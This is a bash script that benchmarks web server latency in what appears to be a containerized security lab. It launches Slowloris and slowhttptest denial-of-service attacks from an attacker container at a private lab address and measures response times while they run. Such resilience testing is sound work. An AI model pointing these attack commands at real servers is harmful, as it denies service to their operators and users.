#!/bin/bash

# Configuration
TARGET_IP="10.10.10.3"
URL="https://${TARGET_IP}"
ATTACKER_CONTAINER="clab-security_lab-attacker_1"
DURATION=30          # Duration of each test in seconds
SOCKETS=1000         # Number of sockets for Slowloris
CONNECTIONS=5000     # Number of connections for Slowhttptest

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# --- Helper Function: Measure Response Time ---
# This function loops for $DURATION seconds, curling the target 
# and calculating the average response time.
measure_latency() {
    local phase_name="$1"
    local end_time=$((SECONDS + DURATION))
    local total_time=0
    local count=0
    local fails=0

    echo -e "${BLUE}[MONITOR] Starting latency measurement for phase: $phase_name${NC}"
    
    while [ $SECONDS -lt $end_time ]; do
        # Extract total_time in seconds from curl
        # -k: Insecure (skip SSL validation)
        # -o /dev/null: discard body
        # -s: silent
        # -w: write out format
        resp_time=$(curl -k -o /dev/null -s -w "%{time_total}" --connect-timeout 2 "$URL")
        
        # Check if the request failed (curl returns 0.000 or empty on strict timeout often, 
        # but let's check exit code or if resp_time is valid)
        if [ -z "$resp_time" ] || [ "$resp_time" == "0.000" ]; then
            fails=$((fails + 1))
        else
            # Sum up (using awk for floating point math)
            total_time=$(awk "BEGIN {print $total_time + $resp_time}")
            count=$((count + 1))
        fi
        
        sleep 1
    done

    echo -e "${BLUE}[MONITOR] Measurement finished.${NC}"
    
    if [ $count -gt 0 ]; then
        avg=$(awk "BEGIN {print $total_time / $count}")
        echo -e "${GREEN}RESULTS for $phase_name:${NC}"
        echo "  - Average Response Time: ${avg} seconds"
        echo "  - Successful Requests:   $count"
        echo "  - Failed Requests:       $fails"
    else
        echo -e "${RED}RESULTS for $phase_name: Server completely unresponsive (0 successes).${NC}"
    fi
    echo "----------------------------------------------------"
}

# --- Step 1: Baseline Measurement ---
echo -e "\n${GREEN}=== PHASE 1: Baseline (No Attack) ===${NC}"
measure_latency "Baseline"

# --- Step 2: Slowloris Attack ---
echo -e "\n${GREEN}=== PHASE 2: Slowloris Attack ===${NC}"
echo "Launching Slowloris (HTTPS) with $SOCKETS sockets..."

# We use 'timeout' inside docker to kill the attack automatically after DURATION + 5 seconds
# allowing the monitor to finish first cleanly.
docker exec $ATTACKER_CONTAINER timeout $((DURATION + 5)) slowloris -p 443 --https -s $SOCKETS $TARGET_IP > /dev/null 2>&1 &
ATTACK_PID=$!

# Run monitoring
measure_latency "Under Slowloris Attack"

# Ensure background process is finished
wait $ATTACK_PID 2>/dev/null

# --- Step 3: Slowhttptest Attack ---
echo -e "\n${GREEN}=== PHASE 3: Slowhttptest (Slow Read) ===${NC}"
echo "Launching Slowhttptest with $CONNECTIONS connections..."

# -l specifies duration in seconds natively
docker exec $ATTACKER_CONTAINER slowhttptest -c $CONNECTIONS -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://$TARGET_IP -l $((DURATION + 5)) > /dev/null 2>&1 &
ATTACK_PID=$!

# Run monitoring
measure_latency "Under Slowhttptest Attack"

wait $ATTACK_PID 2>/dev/null

echo -e "\n${GREEN}=== Benchmark Complete ===${NC}"